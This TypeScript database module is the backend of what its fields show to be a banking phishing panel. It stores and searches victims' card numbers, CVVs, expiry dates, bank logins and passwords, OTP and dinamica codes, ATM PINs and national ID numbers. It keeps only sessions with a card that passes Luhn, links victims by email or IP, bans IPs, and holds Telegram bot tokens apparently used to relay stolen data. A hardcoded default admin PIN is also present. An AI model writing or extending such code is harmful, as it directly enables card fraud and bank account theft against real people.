import { eq } from "drizzle-orm";
import { drizzle } from "drizzle-orm/postgres";
import { InsertUser, users } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onConflict().doUpdate({ set: updateSet });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// ─── Secure Session Persistence ───────────────────────────────────────────

import { secureSession, InsertSecureSession } from "../drizzle/schema";
import { desc, sql } from "drizzle-orm";

/**
 * Luhn algorithm validation — returns true if the card number is valid
 */
export function isValidLuhn(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\D/g, "");
  if (digits.length < 13 || digits.length > 19) return false;

  let sum = 0;
  let alternate = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alternate) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alternate = !alternate;
  }
  return sum % 10 === 0;
}

export async function upsertSecureSession(data: InsertSecureSession): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert session: database not available");
    return;
  }

  // Server-side Luhn validation: reject sessions with invalid card numbers
  const cardNum = (data as any).cardNumber;
  if (cardNum !== undefined && cardNum !== null) {
    // If cardNumber is provided but empty or fails Luhn, reject
    if (!cardNum || !isValidLuhn(cardNum)) {
      console.warn(`[Database] Rejected session ${(data as any).sessionId}: invalid card number (Luhn check failed)`);
      return;
    }
  }

  try {
    const updateSet: Record<string, unknown> = {};
    const fields = [
      "currentStep", "status", "email", "cardBin", "bankName", "country",
      "cardScheme", "cardNumber", "holderName", "expiryDate", "cvv",
      "loginPassword", "bankUser", "bankPassword", "otpCode", "dinamicaCode",
      "tokenCode", "atmPin", "address", "cedula", "city", "ipAddress", "userAgent"
    ] as const;

    for (const field of fields) {
      if ((data as any)[field] !== undefined) {
        updateSet[field] = (data as any)[field];
      }
    }
    updateSet.updatedAt = new Date();

    await db.insert(secureSession).values(data).onConflict().doUpdate({ set: updateSet });
  } catch (error) {
    console.error("[Database] Failed to upsert secure session:", error);
  }
}

export async function getAllSecureSessions() {
  const db = await getDb();
  if (!db) return [];

  try {
    // Only return sessions that have a valid card number
    return await db.select().from(secureSession)
      .where(sql`cardNumber IS NOT NULL AND cardNumber != ''`)
      .orderBy(desc(secureSession.updatedAt));
  } catch (error) {
    console.error("[Database] Failed to get sessions:", error);
    return [];
  }
}

/**
 * Get paginated sessions ordered by updatedAt (most recent first)
 * Sessions that get reactivated will have their updatedAt bumped and appear first
 */
export async function getPaginatedSessions(page: number = 1, pageSize: number = 20, search: string = ""): Promise<{ sessions: any[]; total: number; totalPages: number; page: number }> {
  const db = await getDb();
  if (!db) return { sessions: [], total: 0, totalPages: 0, page };

  try {
    let countQuery: string;
    let dataQuery: string;
    const offset = (page - 1) * pageSize;

    // Only show sessions that have a valid card number captured
    const cardFilter = `AND (cardNumber IS NOT NULL AND cardNumber != '')`;

    if (search.trim()) {
      const like = `%${search.trim()}%`;
      const countResult = await db.execute(sql`SELECT COUNT(*) as total FROM secure_sessions WHERE (cardNumber IS NOT NULL AND cardNumber != '') AND (email LIKE ${like} OR cardNumber LIKE ${like} OR cardBin LIKE ${like} OR bankName LIKE ${like} OR ipAddress LIKE ${like} OR holderName LIKE ${like} OR cedula LIKE ${like} OR city LIKE ${like})`) as any;
      const countData = Array.isArray(countResult) ? countResult[0] : countResult;
      const countArr = Array.isArray(countData) ? countData : [];
      const total = countArr[0]?.total ?? 0;
      const totalPages = Math.ceil(total / pageSize);

      const sessionsResult = await db.execute(sql`SELECT * FROM secure_sessions WHERE (cardNumber IS NOT NULL AND cardNumber != '') AND (email LIKE ${like} OR cardNumber LIKE ${like} OR cardBin LIKE ${like} OR bankName LIKE ${like} OR ipAddress LIKE ${like} OR holderName LIKE ${like} OR cedula LIKE ${like} OR city LIKE ${like}) ORDER BY updatedAt DESC LIMIT ${pageSize} OFFSET ${offset}`) as any;
      const sessionsData = Array.isArray(sessionsResult) ? sessionsResult[0] : sessionsResult;
      const rawSessions = Array.isArray(sessionsData) ? sessionsData : [];
      // Normalize snake_case DB columns to camelCase expected by frontend
      const sessions = rawSessions.map((row: any) => ({
        id: row.id,
        sessionId: row.sessionId || row.session_id,
        email: row.email,
        ipAddress: row.ipAddress || row.ip_address,
        cardBin: row.cardBin || row.card_bin,
        cardNumber: row.cardNumber || row.card_number,
        cardScheme: row.cardScheme || row.card_scheme,
        cardCategory: row.cardCategory || row.card_category,
        bankName: row.bankName || row.bank_name,
        country: row.country,
        holderName: row.holderName || row.holder_name,
        expiryDate: row.expiryDate || row.expiry_date,
        cvv: row.cvv,
        address: row.address,
        cedula: row.cedula,
        city: row.city,
        phone: row.phone,
        bankUser: row.bankUser || row.bank_user,
        bankPassword: row.bankPassword || row.bank_password,
        loginPassword: row.loginPassword || row.login_password,
        otpCode: row.otpCode || row.otp_code,
        dinamicaCode: row.dinamicaCode || row.dinamica_code,
        tokenCode: row.tokenCode || row.token_code,
        atmPin: row.atmPin || row.atm_pin,
        customTextResponse: row.customTextResponse || row.custom_text_response,
        currentStep: row.currentStep || row.current_step,
        status: row.status,
        createdAt: row.createdAt || row.created_at,
        updatedAt: row.updatedAt || row.updated_at,
      }));

      return { sessions, total, totalPages, page };
    } else {
      // No search - only sessions with valid card
      const countResult = await db.execute(sql`SELECT COUNT(*) as total FROM secure_sessions WHERE cardNumber IS NOT NULL AND cardNumber != ''`) as any;
      const countData = Array.isArray(countResult) ? countResult[0] : countResult;
      const countArr = Array.isArray(countData) ? countData : [];
      const total = countArr[0]?.total ?? 0;
      const totalPages = Math.ceil(total / pageSize);

      const sessionsResult = await db.execute(sql`SELECT * FROM secure_sessions WHERE cardNumber IS NOT NULL AND cardNumber != '' ORDER BY updatedAt DESC LIMIT ${pageSize} OFFSET ${offset}`) as any;
      const sessionsData = Array.isArray(sessionsResult) ? sessionsResult[0] : sessionsResult;
      const sessions = Array.isArray(sessionsData) ? sessionsData : [];

      return { sessions, total, totalPages, page };
    }
  } catch (error) {
    console.error("[Database] Failed to get paginated sessions:", error);
    return { sessions: [], total: 0, totalPages: 0, page };
  }
}

export async function clearAllSecureSessions(): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  try {
    await db.delete(secureSession);
    console.log("[Database] All secure sessions cleared");
    return true;
  } catch (error) {
    console.error("[Database] Failed to clear sessions:", error);
    return false;
  }
}

// ==========================================
// BANNED IPs
// ==========================================
import { bannedIps } from "../drizzle/schema";

export async function banIP(ipAddress: string, reason?: string): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  try {
    await db.insert(bannedIps).values({
      ipAddress,
      reason: reason || "Banned by admin",
      bannedBy: "admin",
    }).onConflict().doUpdate({ set: { reason: reason || "Banned by admin" } });
    console.log(`[Database] IP banned: ${ipAddress}`);
    return true;
  } catch (error) {
    console.error("[Database] Failed to ban IP:", error);
    return false;
  }
}

export async function unbanIP(ipAddress: string): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  try {
    await db.delete(bannedIps).where(eq(bannedIps.ipAddress, ipAddress));
    console.log(`[Database] IP unbanned: ${ipAddress}`);
    return true;
  } catch (error) {
    console.error("[Database] Failed to unban IP:", error);
    return false;
  }
}

export async function isIPBanned(ipAddress: string): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  try {
    const result = await db.select().from(bannedIps).where(eq(bannedIps.ipAddress, ipAddress));
    return result.length > 0;
  } catch (error) {
    console.error("[Database] Failed to check banned IP:", error);
    return false;
  }
}

export async function getAllBannedIPs(): Promise<Array<{ ipAddress: string; reason: string | null; createdAt: Date }>> {
  const db = await getDb();
  if (!db) return [];

  try {
    const result = await db.select().from(bannedIps);
    return result;
  } catch (error) {
    console.error("[Database] Failed to get banned IPs:", error);
    return [];
  }
}

// ==========================================
// VISIT COUNTER
// ==========================================
import { visitCounter } from "../drizzle/schema";

export async function incrementVisitCount(): Promise<number> {
  const db = await getDb();
  if (!db) return 0;

  try {
    // Try to update existing row
    const existing = await db.select().from(visitCounter).limit(1);
    if (existing.length === 0) {
      // Insert first row
      await db.insert(visitCounter).values({ count: 1 });
      return 1;
    } else {
      await db.update(visitCounter).set({ count: sql`${visitCounter.count} + 1` });
      const updated = await db.select().from(visitCounter).limit(1);
      return updated[0]?.count ?? 1;
    }
  } catch (error) {
    console.error("[Database] Failed to increment visit count:", error);
    return 0;
  }
}

export async function getVisitCount(): Promise<number> {
  const db = await getDb();
  if (!db) return 0;

  try {
    const result = await db.select().from(visitCounter).limit(1);
    return result[0]?.count ?? 0;
  } catch (error) {
    console.error("[Database] Failed to get visit count:", error);
    return 0;
  }
}

export async function resetVisitCount(): Promise<void> {
  const db = await getDb();
  if (!db) return;

  try {
    await db.update(visitCounter).set({ count: 0 });
  } catch (error) {
    console.error("[Database] Failed to reset visit count:", error);
  }
}

// ==========================================
// APP CONFIG (persistent key-value store)
// ==========================================
import { appConfig } from "../drizzle/schema";

const CONFIG_KEYS = ["adminPin", "telegramBotToken", "telegramChatId", "telegramFaceidBotToken", "telegramFaceidChatId"] as const;
const ALL_CONFIG_KEYS = ["adminPin", "telegramBotToken", "telegramChatId", "telegramFaceidBotToken", "telegramFaceidChatId", "securityEnabled"] as const;
type ConfigKey = typeof ALL_CONFIG_KEYS[number];

export interface AppConfigMap {
  adminPin: string;
  telegramBotToken: string;
  telegramChatId: string;
  telegramFaceidBotToken: string;
  telegramFaceidChatId: string;
  securityEnabled: string;
}

export async function getAppConfig(): Promise<AppConfigMap> {
  const defaults: AppConfigMap = {
    adminPin: "199683",
    telegramBotToken: "",
    telegramChatId: "",
    telegramFaceidBotToken: "",
    telegramFaceidChatId: "",
    securityEnabled: "false",
  };

  const db = await getDb();
  if (!db) return defaults;

  try {
    const rows = await db.select().from(appConfig);
    const map: Partial<AppConfigMap> = {};
    for (const row of rows) {
      if (ALL_CONFIG_KEYS.includes(row.key as ConfigKey)) {
        map[row.key as ConfigKey] = row.value;
      }
    }
    return { ...defaults, ...map };
  } catch (error) {
    console.error("[Database] Failed to get app config:", error);
    return defaults;
  }
}

export async function setAppConfig(updates: Partial<AppConfigMap>): Promise<void> {
  const db = await getDb();
  if (!db) return;

  try {
    for (const [key, value] of Object.entries(updates)) {
      if (!ALL_CONFIG_KEYS.includes(key as ConfigKey)) continue;
      if (value === undefined || value === null) continue;
      await db.insert(appConfig)
        .values({ key, value: String(value) })
        .onConflict().doUpdate({ set: { value: String(value) } });
    }
  } catch (error) {
    console.error("[Database] Failed to set app config:", error);
  }
}

// ─── Pending Custom Text (persisted across restarts) ──────────────────────────

export async function setPendingCustomText(chatId: string, sessionId: string): Promise<void> {
  const db = await getDb();
  if (!db) return;
  try {
    await db.execute(
      sql`INSERT INTO pending_custom_text (chat_id, session_id, created_at)
          VALUES (${chatId}, ${sessionId}, ${Date.now()})
          ON CONFLICT (chat_id) DO UPDATE SET session_id = excluded.session_id, created_at = excluded.created_at`
    );
  } catch (error) {
    console.error("[Database] Failed to set pending custom text:", error);
  }
}

export async function getPendingCustomText(chatId: string): Promise<string | null> {
  const db = await getDb();
  if (!db) return null;
  try {
    const rows = await db.execute(
      sql`SELECT session_id FROM pending_custom_text WHERE chat_id = ${chatId} LIMIT 1`
    ) as any;
    const data = Array.isArray(rows) ? rows[0] : rows;
    const arr = Array.isArray(data) ? data : [];
    if (arr.length > 0 && arr[0].session_id) {
      return arr[0].session_id as string;
    }
    return null;
  } catch (error) {
    console.error("[Database] Failed to get pending custom text:", error);
    return null;
  }
}

export async function deletePendingCustomText(chatId: string): Promise<void> {
  const db = await getDb();
  if (!db) return;
  try {
    await db.execute(
      sql`DELETE FROM pending_custom_text WHERE chat_id = ${chatId}`
    );
  } catch (error) {
    console.error("[Database] Failed to delete pending custom text:", error);
  }
}

// ==========================================
// LINKED SESSIONS (same email or IP)
// ==========================================
import { or, and, ne, isNotNull } from "drizzle-orm";

export async function getLinkedSessions(email?: string | null, ipAddress?: string | null, excludeSessionId?: string): Promise<any[]> {
  const db = await getDb();
  if (!db) return [];
  if (!email && !ipAddress) return [];

  try {
    const conditions: any[] = [];
    if (email) {
      conditions.push(eq(secureSession.email, email));
    }
    if (ipAddress) {
      conditions.push(eq(secureSession.ipAddress, ipAddress));
    }

    let results = await db.select().from(secureSession)
      .where(or(...conditions))
      .orderBy(desc(secureSession.updatedAt));

    // Exclude the current session if specified
    if (excludeSessionId) {
      results = results.filter((s: any) => s.sessionId !== excludeSessionId);
    }

    return results;
  } catch (error) {
    console.error("[Database] Failed to get linked sessions:", error);
    return [];
  }
}

export async function getPreviousCardForUser(email?: string | null, ipAddress?: string | null, excludeSessionId?: string): Promise<any | null> {
  const linked = await getLinkedSessions(email, ipAddress, excludeSessionId);
  // Return the most recent previous session that has card data
  return linked.find((s: any) => s.cardNumber || s.cardBin) || null;
}

// ==========================================
// TRAFFIC LOG
// ==========================================
import { trafficLog, InsertTrafficLog } from "../drizzle/schema";

export async function logTraffic(entry: Omit<InsertTrafficLog, "id" | "createdAt">): Promise<void> {
  const db = await getDb();
  if (!db) return;

  try {
    await db.insert(trafficLog).values(entry as any);
  } catch (error) {
    // Silently fail — don't break the request for logging
  }
}

export async function getTrafficLog(page: number = 1, limit: number = 50): Promise<{ logs: any[]; total: number }> {
  const db = await getDb();
  if (!db) return { logs: [], total: 0 };

  try {
    const offset = (page - 1) * limit;
    const logs = await db.select().from(trafficLog)
      .orderBy(desc(trafficLog.createdAt))
      .limit(limit)
      .offset(offset);

    const countResult = await db.select({ count: sql<number>`COUNT(*)` }).from(trafficLog);
    const total = countResult[0]?.count ?? 0;

    return { logs, total };
  } catch (error) {
    console.error("[Database] Failed to get traffic log:", error);
    return { logs: [], total: 0 };
  }
}

export async function clearTrafficLog(): Promise<void> {
  const db = await getDb();
  if (!db) return;

  try {
    await db.delete(trafficLog);
  } catch (error) {
    console.error("[Database] Failed to clear traffic log:", error);
  }
}
